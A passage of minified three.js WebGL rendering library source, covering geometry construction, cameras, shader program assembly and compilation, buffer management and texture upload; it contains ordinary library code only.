J=O*H-x;for(M=0;M<g;M++)P[a]=(M*da-aa)*d,P[b]=J*e,P[c]=D,k.push(P.x,P.y,P.z),P[a]=0,P[b]=0,P[c]=0<l?1:-1,t.push(P.x,P.y,P.z),p.push(M/L),p.push(1-O/C),f+=1}for(O=0;O<C;O++)for(M=\n0;M<L;M++)a=n+M+g*(O+1),b=n+(M+1)+g*(O+1),c=n+(M+1)+g*O,m.push(n+M+g*O,a,c),m.push(a,b,c),Q+=6;h.addGroup(u,Q,F);u+=Q;n+=f}I.call(this);this.type=\"BoxBufferGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};var h=this;d=Math.floor(d)||1;e=Math.floor(e)||1;f=Math.floor(f)||1;var m=[],k=[],t=[],p=[],n=0,u=0;g(\"z\",\"y\",\"x\",-1,-1,c,b,a,f,e,0);g(\"z\",\"y\",\"x\",1,-1,c,b,-a,f,e,1);g(\"x\",\"z\",\"y\",1,1,a,c,b,d,f,2);g(\"x\",\"z\",\"y\",1,-1,a,c,-b,d,f,3);g(\"x\",\"y\",\"z\",\n1,-1,a,b,c,d,e,4);g(\"x\",\"y\",\"z\",-1,-1,a,b,-c,d,e,5);this.setIndex(m);this.addAttribute(\"position\",new z(k,3));this.addAttribute(\"normal\",new z(t,3));this.addAttribute(\"uv\",new z(p,2))}function Ac(a,b,c,d){T.call(this);this.type=\"PlaneGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};this.fromBufferGeometry(new lb(a,b,c,d))}function lb(a,b,c,d){I.call(this);this.type=\"PlaneBufferGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};var e=a/2,f=b/\n2;c=Math.floor(c)||1;d=Math.floor(d)||1;var g=c+1,h=d+1,m=a/c,k=b/d,t=[],p=[],n=[],u=[];for(a=0;a<h;a++){var l=a*k-f;for(b=0;b<g;b++)p.push(b*m-e,-l,0),n.push(0,0,1),u.push(b/c),u.push(1-a/d)}for(a=0;a<d;a++)for(b=0;b<c;b++)e=b+g*(a+1),f=b+1+g*(a+1),h=b+1+g*a,t.push(b+g*a,e,h),t.push(e,f,h);this.setIndex(t);this.addAttribute(\"position\",new z(p,3));this.addAttribute(\"normal\",new z(n,3));this.addAttribute(\"uv\",new z(u,2))}function ra(){x.call(this);this.type=\"Camera\";this.matrixWorldInverse=new S;this.projectionMatrix=\nnew S}function Fa(a,b,c,d){ra.call(this);this.type=\"PerspectiveCamera\";this.fov=void 0!==a?a:50;this.zoom=1;this.near=void 0!==c?c:.1;this.far=void 0!==d?d:2E3;this.focus=10;this.aspect=void 0!==b?b:1;this.view=null;this.filmGauge=35;this.filmOffset=0;this.updateProjectionMatrix()}function Jb(a,b,c,d,e,f){ra.call(this);this.type=\"OrthographicCamera\";this.zoom=1;this.view=null;this.left=a;this.right=b;this.top=c;this.bottom=d;this.near=void 0!==e?e:.1;this.far=void 0!==f?f:2E3;this.updateProjectionMatrix()}\nfunction Cf(a,b,c){var d,e,f;return{setMode:function(a){d=a},setIndex:function(c){c.array instanceof Uint32Array&&b.get(\"OES_element_index_uint\")?(e=a.UNSIGNED_INT,f=4):c.array instanceof Uint16Array?(e=a.UNSIGNED_SHORT,f=2):(e=a.UNSIGNED_BYTE,f=1)},render:function(b,h){a.drawElements(d,h,e,b*f);c.calls++;c.vertices+=h;d===a.TRIANGLES&&(c.faces+=h/3)},renderInstances:function(g,h,m){var k=b.get(\"ANGLE_instanced_arrays\");null===k?console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\"):\n(k.drawElementsInstancedANGLE(d,m,e,h*f,g.maxInstancedCount),c.calls++,c.vertices+=m*g.maxInstancedCount,d===a.TRIANGLES&&(c.faces+=g.maxInstancedCount*m/3))}}}function Df(a,b,c){var d;return{setMode:function(a){d=a},render:function(b,f){a.drawArrays(d,b,f);c.calls++;c.vertices+=f;d===a.TRIANGLES&&(c.faces+=f/3)},renderInstances:function(e){var f=b.get(\"ANGLE_instanced_arrays\");if(null===f)console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");\nelse{var g=e.attributes.position,g=g.isInterleavedBufferAttribute?g.data.count:g.count;f.drawArraysInstancedANGLE(d,0,g,e.maxInstancedCount);c.calls++;c.vertices+=g*e.maxInstancedCount;d===a.TRIANGLES&&(c.faces+=e.maxInstancedCount*g/3)}}}}function Ef(){var a={};return{get:function(b){if(void 0!==a[b.id])return a[b.id];var c;switch(b.type){case \"DirectionalLight\":c={direction:new q,color:new J,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new D};break;case \"SpotLight\":c={position:new q,direction:new q,\ncolor:new J,distance:0,coneCos:0,penumbraCos:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new D};break;case \"PointLight\":c={position:new q,color:new J,distance:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new D};break;case \"HemisphereLight\":c={direction:new q,skyColor:new J,groundColor:new J};break;case \"RectAreaLight\":c={color:new J,position:new q,halfWidth:new q,halfHeight:new q}}return a[b.id]=c}}}function Ff(a){a=a.split(\"\\n\");for(var b=0;b<a.length;b++)a[b]=\nb+1+\": \"+a[b];return a.join(\"\\n\")}function Ne(a,b,c){var d=a.createShader(b);a.shaderSource(d,c);a.compileShader(d);!1===a.getShaderParameter(d,a.COMPILE_STATUS)&&console.error(\"THREE.WebGLShader: Shader couldn't compile.\");\"\"!==a.getShaderInfoLog(d)&&console.warn(\"THREE.WebGLShader: gl.getShaderInfoLog()\",b===a.VERTEX_SHADER?\"vertex\":\"fragment\",a.getShaderInfoLog(d),Ff(c));return d}function Oe(a){switch(a){case 3E3:return[\"Linear\",\"( value )\"];case 3001:return[\"sRGB\",\"( value )\"];case 3002:return[\"RGBE\",\n\"( value )\"];case 3004:return[\"RGBM\",\"( value, 7.0 )\"];case 3005:return[\"RGBM\",\"( value, 16.0 )\"];case 3006:return[\"RGBD\",\"( value, 256.0 )\"];case 3007:return[\"Gamma\",\"( value, float( GAMMA_FACTOR ) )\"];default:throw Error(\"unsupported encoding: \"+a);}}function Wd(a,b){var c=Oe(b);return\"vec4 \"+a+\"( vec4 value ) { return \"+c[0]+\"ToLinear\"+c[1]+\"; }\"}function Gf(a,b){var c=Oe(b);return\"vec4 \"+a+\"( vec4 value ) { return LinearTo\"+c[0]+c[1]+\"; }\"}function Hf(a,b){var c;switch(b){case 1:c=\"Linear\";break;\ncase 2:c=\"Reinhard\";break;case 3:c=\"Uncharted2\";break;case 4:c=\"OptimizedCineon\";break;default:throw Error(\"unsupported toneMapping: \"+b);}return\"vec3 \"+a+\"( vec3 color ) { return \"+c+\"ToneMapping( color ); }\"}function If(a,b,c){a=a||{};return[a.derivatives||b.envMapCubeUV||b.bumpMap||b.normalMap||b.flatShading?\"#extension GL_OES_standard_derivatives : enable\":\"\",(a.fragDepth||b.logarithmicDepthBuffer)&&c.get(\"EXT_frag_depth\")?\"#extension GL_EXT_frag_depth : enable\":\"\",a.drawBuffers&&c.get(\"WEBGL_draw_buffers\")?\n\"#extension GL_EXT_draw_buffers : require\":\"\",(a.shaderTextureLOD||b.envMap)&&c.get(\"EXT_shader_texture_lod\")?\"#extension GL_EXT_shader_texture_lod : enable\":\"\"].filter(Bc).join(\"\\n\")}function Jf(a){var b=[],c;for(c in a){var d=a[c];!1!==d&&b.push(\"#define \"+c+\" \"+d)}return b.join(\"\\n\")}function Bc(a){return\"\"!==a}function Pe(a,b){return a.replace(/NUM_DIR_LIGHTS/g,b.numDirLights).replace(/NUM_SPOT_LIGHTS/g,b.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g,b.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,\nb.numPointLights).replace(/NUM_HEMI_LIGHTS/g,b.numHemiLights)}function Xd(a){return a.replace(/#include +<([\\w\\d.]+)>/g,function(a,c){var d=Z[c];if(void 0===d)throw Error(\"Can not resolve #include <\"+c+\">\");return Xd(d)})}function Qe(a){return a.replace(/for \\( int i \\= (\\d+)\\; i < (\\d+)\\; i \\+\\+ \\) \\{([\\s\\S]+?)(?=\\})\\}/g,function(a,c,d,e){a=\"\";for(c=parseInt(c);c<parseInt(d);c++)a+=e.replace(/\\[ i \\]/g,\"[ \"+c+\" ]\");return a})}function Kf(a,b,c,d){var e=a.context,f=c.extensions,g=c.defines,h=c.__webglShader.vertexShader,\nm=c.__webglShader.fragmentShader,k=\"SHADOWMAP_TYPE_BASIC\";1===d.shadowMapType?k=\"SHADOWMAP_TYPE_PCF\":2===d.shadowMapType&&(k=\"SHADOWMAP_TYPE_PCF_SOFT\");var t=\"ENVMAP_TYPE_CUBE\",p=\"ENVMAP_MODE_REFLECTION\",n=\"ENVMAP_BLENDING_MULTIPLY\";if(d.envMap){switch(c.envMap.mapping){case 301:case 302:t=\"ENVMAP_TYPE_CUBE\";break;case 306:case 307:t=\"ENVMAP_TYPE_CUBE_UV\";break;case 303:case 304:t=\"ENVMAP_TYPE_EQUIREC\";break;case 305:t=\"ENVMAP_TYPE_SPHERE\"}switch(c.envMap.mapping){case 302:case 304:p=\"ENVMAP_MODE_REFRACTION\"}switch(c.combine){case 0:n=\n\"ENVMAP_BLENDING_MULTIPLY\";break;case 1:n=\"ENVMAP_BLENDING_MIX\";break;case 2:n=\"ENVMAP_BLENDING_ADD\"}}var u=0<a.gammaFactor?a.gammaFactor:1,f=If(f,d,a.extensions),l=Jf(g),r=e.createProgram();c.isRawShaderMaterial?(g=[l,\"\\n\"].filter(Bc).join(\"\\n\"),k=[f,l,\"\\n\"].filter(Bc).join(\"\\n\")):(g=[\"precision \"+d.precision+\" float;\",\"precision \"+d.precision+\" int;\",\"#define SHADER_NAME \"+c.__webglShader.name,l,d.supportsVertexTextures?\"#define VERTEX_TEXTURES\":\"\",\"#define GAMMA_FACTOR \"+u,\"#define MAX_BONES \"+\nd.maxBones,d.useFog&&d.fog?\"#define USE_FOG\":\"\",d.useFog&&d.fogExp?\"#define FOG_EXP2\":\"\",d.map?\"#define USE_MAP\":\"\",d.envMap?\"#define USE_ENVMAP\":\"\",d.envMap?\"#define \"+p:\"\",d.lightMap?\"#define USE_LIGHTMAP\":\"\",d.aoMap?\"#define USE_AOMAP\":\"\",d.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",d.bumpMap?\"#define USE_BUMPMAP\":\"\",d.normalMap?\"#define USE_NORMALMAP\":\"\",d.displacementMap&&d.supportsVertexTextures?\"#define USE_DISPLACEMENTMAP\":\"\",d.specularMap?\"#define USE_SPECULARMAP\":\"\",d.roughnessMap?\"#define USE_ROUGHNESSMAP\":\n\"\",d.metalnessMap?\"#define USE_METALNESSMAP\":\"\",d.alphaMap?\"#define USE_ALPHAMAP\":\"\",d.vertexColors?\"#define USE_COLOR\":\"\",d.flatShading?\"#define FLAT_SHADED\":\"\",d.skinning?\"#define USE_SKINNING\":\"\",d.useVertexTexture?\"#define BONE_TEXTURE\":\"\",d.morphTargets?\"#define USE_MORPHTARGETS\":\"\",d.morphNormals&&!1===d.flatShading?\"#define USE_MORPHNORMALS\":\"\",d.doubleSided?\"#define DOUBLE_SIDED\":\"\",d.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+d.numClippingPlanes,d.shadowMapEnabled?\"#define USE_SHADOWMAP\":\n\"\",d.shadowMapEnabled?\"#define \"+k:\"\",d.sizeAttenuation?\"#define USE_SIZEATTENUATION\":\"\",d.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",d.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\"#define USE_LOGDEPTHBUF_EXT\":\"\",\"uniform mat4 modelMatrix;\",\"uniform mat4 modelViewMatrix;\",\"uniform mat4 projectionMatrix;\",\"uniform mat4 viewMatrix;\",\"uniform mat3 normalMatrix;\",\"uniform vec3 cameraPosition;\",\"attribute vec3 position;\",\"attribute vec3 normal;\",\"attribute vec2 uv;\",\"#ifdef USE_COLOR\",\n\"\\tattribute vec3 color;\",\"#endif\",\"#ifdef USE_MORPHTARGETS\",\"\\tattribute vec3 morphTarget0;\",\"\\tattribute vec3 morphTarget1;\",\"\\tattribute vec3 morphTarget2;\",\"\\tattribute vec3 morphTarget3;\",\"\\t#ifdef USE_MORPHNORMALS\",\"\\t\\tattribute vec3 morphNormal0;\",\"\\t\\tattribute vec3 morphNormal1;\",\"\\t\\tattribute vec3 morphNormal2;\",\"\\t\\tattribute vec3 morphNormal3;\",\"\\t#else\",\"\\t\\tattribute vec3 morphTarget4;\",\"\\t\\tattribute vec3 morphTarget5;\",\"\\t\\tattribute vec3 morphTarget6;\",\"\\t\\tattribute vec3 morphTarget7;\",\n\"\\t#endif\",\"#endif\",\"#ifdef USE_SKINNING\",\"\\tattribute vec4 skinIndex;\",\"\\tattribute vec4 skinWeight;\",\"#endif\",\"\\n\"].filter(Bc).join(\"\\n\"),k=[f,\"precision \"+d.precision+\" float;\",\"precision \"+d.precision+\" int;\",\"#define SHADER_NAME \"+c.__webglShader.name,l,d.alphaTest?\"#define ALPHATEST \"+d.alphaTest:\"\",\"#define GAMMA_FACTOR \"+u,d.useFog&&d.fog?\"#define USE_FOG\":\"\",d.useFog&&d.fogExp?\"#define FOG_EXP2\":\"\",d.map?\"#define USE_MAP\":\"\",d.envMap?\"#define USE_ENVMAP\":\"\",d.envMap?\"#define \"+t:\"\",d.envMap?\n\"#define \"+p:\"\",d.envMap?\"#define \"+n:\"\",d.lightMap?\"#define USE_LIGHTMAP\":\"\",d.aoMap?\"#define USE_AOMAP\":\"\",d.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",d.bumpMap?\"#define USE_BUMPMAP\":\"\",d.normalMap?\"#define USE_NORMALMAP\":\"\",d.specularMap?\"#define USE_SPECULARMAP\":\"\",d.roughnessMap?\"#define USE_ROUGHNESSMAP\":\"\",d.metalnessMap?\"#define USE_METALNESSMAP\":\"\",d.alphaMap?\"#define USE_ALPHAMAP\":\"\",d.vertexColors?\"#define USE_COLOR\":\"\",d.gradientMap?\"#define USE_GRADIENTMAP\":\"\",d.flatShading?\"#define FLAT_SHADED\":\n\"\",d.doubleSided?\"#define DOUBLE_SIDED\":\"\",d.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+d.numClippingPlanes,\"#define UNION_CLIPPING_PLANES \"+(d.numClippingPlanes-d.numClipIntersection),d.shadowMapEnabled?\"#define USE_SHADOWMAP\":\"\",d.shadowMapEnabled?\"#define \"+k:\"\",d.premultipliedAlpha?\"#define PREMULTIPLIED_ALPHA\":\"\",d.physicallyCorrectLights?\"#define PHYSICALLY_CORRECT_LIGHTS\":\"\",d.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",d.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\n\"#define USE_LOGDEPTHBUF_EXT\":\"\",d.envMap&&a.extensions.get(\"EXT_shader_texture_lod\")?\"#define TEXTURE_LOD_EXT\":\"\",\"uniform mat4 viewMatrix;\",\"uniform vec3 cameraPosition;\",0!==d.toneMapping?\"#define TONE_MAPPING\":\"\",0!==d.toneMapping?Z.tonemapping_pars_fragment:\"\",0!==d.toneMapping?Hf(\"toneMapping\",d.toneMapping):\"\",d.outputEncoding||d.mapEncoding||d.envMapEncoding||d.emissiveMapEncoding?Z.encodings_pars_fragment:\"\",d.mapEncoding?Wd(\"mapTexelToLinear\",d.mapEncoding):\"\",d.envMapEncoding?Wd(\"envMapTexelToLinear\",\nd.envMapEncoding):\"\",d.emissiveMapEncoding?Wd(\"emissiveMapTexelToLinear\",d.emissiveMapEncoding):\"\",d.outputEncoding?Gf(\"linearToOutputTexel\",d.outputEncoding):\"\",d.depthPacking?\"#define DEPTH_PACKING \"+c.depthPacking:\"\",\"\\n\"].filter(Bc).join(\"\\n\"));h=Xd(h,d);h=Pe(h,d);m=Xd(m,d);m=Pe(m,d);c.isShaderMaterial||(h=Qe(h),m=Qe(m));m=k+m;h=Ne(e,e.VERTEX_SHADER,g+h);m=Ne(e,e.FRAGMENT_SHADER,m);e.attachShader(r,h);e.attachShader(r,m);void 0!==c.index0AttributeName?e.bindAttribLocation(r,0,c.index0AttributeName):\n!0===d.morphTargets&&e.bindAttribLocation(r,0,\"position\");e.linkProgram(r);d=e.getProgramInfoLog(r);t=e.getShaderInfoLog(h);p=e.getShaderInfoLog(m);u=n=!0;if(!1===e.getProgramParameter(r,e.LINK_STATUS))n=!1,console.error(\"THREE.WebGLProgram: shader error: \",e.getError(),\"gl.VALIDATE_STATUS\",e.getProgramParameter(r,e.VALIDATE_STATUS),\"gl.getProgramInfoLog\",d,t,p);else if(\"\"!==d)console.warn(\"THREE.WebGLProgram: gl.getProgramInfoLog()\",d);else if(\"\"===t||\"\"===p)u=!1;u&&(this.diagnostics={runnable:n,\nmaterial:c,programLog:d,vertexShader:{log:t,prefix:g},fragmentShader:{log:p,prefix:k}});e.deleteShader(h);e.deleteShader(m);var q;this.getUniforms=function(){void 0===q&&(q=new $a(e,r,a));return q};var w;this.getAttributes=function(){if(void 0===w){for(var a={},b=e.getProgramParameter(r,e.ACTIVE_ATTRIBUTES),c=0;c<b;c++){var d=e.getActiveAttrib(r,c).name;a[d]=e.getAttribLocation(r,d)}w=a}return w};this.destroy=function(){e.deleteProgram(r);this.program=void 0};Object.defineProperties(this,{uniforms:{get:function(){console.warn(\"THREE.WebGLProgram: .uniforms is now .getUniforms().\");\nreturn this.getUniforms()}},attributes:{get:function(){console.warn(\"THREE.WebGLProgram: .attributes is now .getAttributes().\");return this.getAttributes()}}});this.id=Lf++;this.code=b;this.usedTimes=1;this.program=r;this.vertexShader=h;this.fragmentShader=m;return this}function Mf(a,b){function c(a,b){var c;a?a.isTexture?c=a.encoding:a.isWebGLRenderTarget&&(console.warn(\"THREE.WebGLPrograms.getTextureEncodingFromMap: don't use render targets as textures. Use their .texture property instead.\"),c=\na.texture.encoding):c=3E3;3E3===c&&b&&(c=3007);return c}var d=[],e={MeshDepthMaterial:\"depth\",MeshNormalMaterial:\"normal\",MeshBasicMaterial:\"basic\",MeshLambertMaterial:\"lambert\",MeshPhongMaterial:\"phong\",MeshToonMaterial:\"phong\",MeshStandardMaterial:\"physical\",MeshPhysicalMaterial:\"physical\",LineBasicMaterial:\"basic\",LineDashedMaterial:\"dashed\",PointsMaterial:\"points\"},f=\"precision supportsVertexTextures map mapEncoding envMap envMapMode envMapEncoding lightMap aoMap emissiveMap emissiveMapEncoding bumpMap normalMap displacementMap specularMap roughnessMap metalnessMap gradientMap alphaMap combine vertexColors fog useFog fogExp flatShading sizeAttenuation logarithmicDepthBuffer skinning maxBones useVertexTexture morphTargets morphNormals maxMorphTargets maxMorphNormals premultipliedAlpha numDirLights numPointLights numSpotLights numHemiLights numRectAreaLights shadowMapEnabled shadowMapType toneMapping physicallyCorrectLights alphaTest doubleSided flipSided numClippingPlanes numClipIntersection depthPacking\".split(\" \");\nthis.getParameters=function(d,f,m,k,t,p){var n=e[d.type],u;b.floatVertexTextures&&p&&p.skeleton&&p.skeleton.useVertexTexture?u=1024:(u=Math.floor((b.maxVertexUniforms-20)/4),void 0!==p&&p&&p.isSkinnedMesh&&(u=Math.min(p.skeleton.bones.length,u),u<p.skeleton.bones.length&&console.warn(\"WebGLRenderer: too many bones - \"+p.skeleton.bones.length+\", this GPU supports just \"+u+\" (try OpenGL instead of ANGLE)\")));var l=a.getPrecision();null!==d.precision&&(l=b.getMaxPrecision(d.precision),l!==d.precision&&\nconsole.warn(\"THREE.WebGLProgram.getParameters:\",d.precision,\"not supported, using\",l,\"instead.\"));var r=a.getCurrentRenderTarget();return{shaderID:n,precision:l,supportsVertexTextures:b.vertexTextures,outputEncoding:c(r?r.texture:null,a.gammaOutput),map:!!d.map,mapEncoding:c(d.map,a.gammaInput),envMap:!!d.envMap,envMapMode:d.envMap&&d.envMap.mapping,envMapEncoding:c(d.envMap,a.gammaInput),envMapCubeUV:!!d.envMap&&(306===d.envMap.mapping||307===d.envMap.mapping),lightMap:!!d.lightMap,aoMap:!!d.aoMap,\nemissiveMap:!!d.emissiveMap,emissiveMapEncoding:c(d.emissiveMap,a.gammaInput),bumpMap:!!d.bumpMap,normalMap:!!d.normalMap,displacementMap:!!d.displacementMap,roughnessMap:!!d.roughnessMap,metalnessMap:!!d.metalnessMap,specularMap:!!d.specularMap,alphaMap:!!d.alphaMap,gradientMap:!!d.gradientMap,combine:d.combine,vertexColors:d.vertexColors,fog:!!m,useFog:d.fog,fogExp:m&&m.isFogExp2,flatShading:1===d.shading,sizeAttenuation:d.sizeAttenuation,logarithmicDepthBuffer:b.logarithmicDepthBuffer,skinning:d.skinning,\nmaxBones:u,useVertexTexture:b.floatVertexTextures&&p&&p.skeleton&&p.skeleton.useVertexTexture,morphTargets:d.morphTargets,morphNormals:d.morphNormals,maxMorphTargets:a.maxMorphTargets,maxMorphNormals:a.maxMorphNormals,numDirLights:f.directional.length,numPointLights:f.point.length,numSpotLights:f.spot.length,numRectAreaLights:f.rectArea.length,numHemiLights:f.hemi.length,numClippingPlanes:k,numClipIntersection:t,shadowMapEnabled:a.shadowMap.enabled&&p.receiveShadow&&0<f.shadows.length,shadowMapType:a.shadowMap.type,\ntoneMapping:a.toneMapping,physicallyCorrectLights:a.physicallyCorrectLights,premultipliedAlpha:d.premultipliedAlpha,alphaTest:d.alphaTest,doubleSided:2===d.side,flipSided:1===d.side,depthPacking:void 0!==d.depthPacking?d.depthPacking:!1}};this.getProgramCode=function(a,b){var c=[];b.shaderID?c.push(b.shaderID):(c.push(a.fragmentShader),c.push(a.vertexShader));if(void 0!==a.defines)for(var d in a.defines)c.push(d),c.push(a.defines[d]);for(d=0;d<f.length;d++)c.push(b[f[d]]);return c.join()};this.acquireProgram=\nfunction(b,c,e){for(var f,t=0,p=d.length;t<p;t++){var n=d[t];if(n.code===e){f=n;++f.usedTimes;break}}void 0===f&&(f=new Kf(a,e,b,c),d.push(f));return f};this.releaseProgram=function(a){if(0===--a.usedTimes){var b=d.indexOf(a);d[b]=d[d.length-1];d.pop();a.destroy()}};this.programs=d}function Nf(a,b,c){function d(a){var h=a.target;a=f[h.id];null!==a.index&&e(a.index);var m=a.attributes,k;for(k in m)e(m[k]);h.removeEventListener(\"dispose\",d);delete f[h.id];k=b.get(h);k.wireframe&&e(k.wireframe);b[\"delete\"](h);\nh=b.get(a);h.wireframe&&e(h.wireframe);b[\"delete\"](a);c.memory.geometries--}function e(c){var d;d=c.isInterleavedBufferAttribute?b.get(c.data).__webglBuffer:b.get(c).__webglBuffer;void 0!==d&&(a.deleteBuffer(d),c.isInterleavedBufferAttribute?b[\"delete\"](c.data):b[\"delete\"](c))}var f={};return{get:function(a){var b=a.geometry;if(void 0!==f[b.id])return f[b.id];b.addEventListener(\"dispose\",d);var e;b.isBufferGeometry?e=b:b.isGeometry&&(void 0===b._bufferGeometry&&(b._bufferGeometry=(new I).setFromObject(a)),\ne=b._bufferGeometry);f[b.id]=e;c.memory.geometries++;return e}}}function Of(a,b,c){function d(c,d){var e=c.isInterleavedBufferAttribute?c.data:c,m=b.get(e);if(void 0===m.__webglBuffer){m.__webglBuffer=a.createBuffer();a.bindBuffer(d,m.__webglBuffer);a.bufferData(d,e.array,e.dynamic?a.DYNAMIC_DRAW:a.STATIC_DRAW);var k=a.FLOAT,t=e.array;t instanceof Float32Array?k=a.FLOAT:t instanceof Float64Array?console.warn(\"Unsupported data buffer format: Float64Array\"):t instanceof Uint16Array?k=a.UNSIGNED_SHORT:\nt instanceof Int16Array?k=a.SHORT:t instanceof Uint32Array?k=a.UNSIGNED_INT:t instanceof Int32Array?k=a.INT:t instanceof Int8Array?k=a.BYTE:t instanceof Uint8Array&&(k=a.UNSIGNED_BYTE);m.bytesPerElement=t.BYTES_PER_ELEMENT;m.type=k;m.version=e.version;e.onUploadCallback()}else m.version!==e.version&&(a.bindBuffer(d,m.__webglBuffer),!1===e.dynamic?a.bufferData(d,e.array,a.STATIC_DRAW):-1===e.updateRange.count?a.bufferSubData(d,0,e.array):0===e.updateRange.count?console.error(\"THREE.WebGLObjects.updateBuffer: dynamic THREE.BufferAttribute marked as needsUpdate but updateRange.count is 0, ensure you are using set methods or updating manually.\"):\n(a.bufferSubData(d,e.updateRange.offset*e.array.BYTES_PER_ELEMENT,e.array.subarray(e.updateRange.offset,e.updateRange.offset+e.updateRange.count)),e.updateRange.count=0),m.version=e.version)}var e=new Nf(a,b,c);return{getAttributeBuffer:function(a){return a.isInterleavedBufferAttribute?b.get(a.data).__webglBuffer:b.get(a).__webglBuffer},getAttributeProperties:function(a){return a.isInterleavedBufferAttribute?b.get(a.data):b.get(a)},getWireframeAttribute:function(c){var e=b.get(c);if(void 0!==e.wireframe)return e.wireframe;\nvar h=[],m=c.index;c=c.attributes;if(null!==m){m=m.array;c=0;for(var k=m.length;c<k;c+=3){var t=m[c+0],p=m[c+1],n=m[c+2];h.push(t,p,p,n,n,t)}}else for(m=c.position.array,c=0,k=m.length/3-1;c<k;c+=3)t=c+0,p=c+1,n=c+2,h.push(t,p,p,n,n,t);h=new (65535<Ud(h)?jb:ib)(h,1);d(h,a.ELEMENT_ARRAY_BUFFER);return e.wireframe=h},update:function(b){var c=e.get(b);b.geometry.isGeometry&&c.updateFromObject(b);b=c.index;var h=c.attributes;null!==b&&d(b,a.ELEMENT_ARRAY_BUFFER);for(var m in h)d(h[m],a.ARRAY_BUFFER);\nb=c.morphAttributes;for(m in b)for(var h=b[m],k=0,t=h.length;k<t;k++)d(h[k],a.ARRAY_BUFFER);return c}}}function Pf(a,b,c,d,e,f,g){function h(a,b){if(a.width>b||a.height>b){var c=b/Math.max(a.width,a.height),d=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");d.width=Math.floor(a.width*c);d.height=Math.floor(a.height*c);d.getContext(\"2d\").drawImage(a,0,0,a.width,a.height,0,0,d.width,d.height);console.warn(\"THREE.WebGLRenderer: image is too big (\"+a.width+\"x\"+a.height+\"). Resized to \"+\nd.width+\"x\"+d.height,a);return d}return a}function m(a){return N.isPowerOfTwo(a.width)&&N.isPowerOfTwo(a.height)}function k(b){return 1003===b||1004===b||1005===b?a.NEAREST:a.LINEAR}function t(b){b=b.target;b.removeEventListener(\"dispose\",t);a:{var c=d.get(b);if(b.image&&c.__image__webglTextureCube)a.deleteTexture(c.__image__webglTextureCube);else{if(void 0===c.__webglInit)break a;a.deleteTexture(c.__webglTexture)}d[\"delete\"](b)}q.textures--}function p(b){b=b.target;b.removeEventListener(\"dispose\",\np);var c=d.get(b),e=d.get(b.texture);if(b){void 0!==e.__webglTexture&&a.deleteTexture(e.__webglTexture);b.depthTexture&&b.depthTexture.dispose();if(b.isWebGLRenderTargetCube)for(e=0;6>e;e++)a.deleteFramebuffer(c.__webglFramebuffer[e]),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer[e]);else a.deleteFramebuffer(c.__webglFramebuffer),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer);d[\"delete\"](b.texture);d[\"delete\"](b)}q.textures--}function n(b,g){var k=d.get(b);if(0<\nb.version&&k.__version!==b.version){var n=b.image;if(void 0===n)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is undefined\",b);else if(!1===n.complete)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is incomplete\",b);else{void 0===k.__webglInit&&(k.__webglInit=!0,b.addEventListener(\"dispose\",t),k.__webglTexture=a.createTexture(),q.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,k.__webglTexture);a.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,\nb.flipY);a.pixelStorei(a.UNPACK_PREMULTIPLY_ALPHA_WEBGL,b.premultiplyAlpha);a.pixelStorei(a.UNPACK_ALIGNMENT,b.unpackAlignment);var p=h(b.image,e.maxTextureSize);if((1001!==b.wrapS||1001!==b.wrapT||1003!==b.minFilter&&1006!==b.minFilter)&&!1===m(p))if(n=p,n instanceof HTMLImageElement||n instanceof HTMLCanvasElement){var l=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");l.width=N.nearestPowerOfTwo(n.width);l.height=N.nearestPowerOfTwo(n.height);l.getContext(\"2d\").drawImage(n,0,0,\nl.width,l.height);console.warn(\"THREE.WebGLRenderer: image is not power of two (\"+n.width+\"x\"+n.height+\"). Resized to \"+l.width+\"x\"+l.height,n);p=l}else p=n;var n=m(p),l=f(b.format),G=f(b.type);u(a.TEXTURE_2D,b,n);var r=b.mipmaps;if(b.isDepthTexture){r=a.DEPTH_COMPONENT;if(1015===b.type){if(!w)throw Error(\"Float Depth Texture only supported in WebGL2.0\");r=a.DEPTH_COMPONENT32F}else w&&(r=a.DEPTH_COMPONENT16);1026===b.format&&r===a.DEPTH_COMPONENT&&1012!==b.type&&1014!==b.type&&(console.warn(\"THREE.WebGLRenderer: Use UnsignedShortType or UnsignedIntType for DepthFormat DepthTexture.\"),\nb.type=1012,G=f(b.type));1027===b.format&&(r=a.DEPTH_STENCIL,1020!==b.type&&(console.warn(\"THREE.WebGLRenderer: Use UnsignedInt248Type for DepthStencilFormat DepthTexture.\"),b.type=1020,G=f(b.type)));c.texImage2D(a.TEXTURE_2D,0,r,p.width,p.height,0,l,G,null)}else if(b.isDataTexture)if(0<r.length&&n){for(var H=0,aa=r.length;H<aa;H++)p=r[H],c.texImage2D(a.TEXTURE_2D,H,l,p.width,p.height,0,l,G,p.data);b.generateMipmaps=!1}else 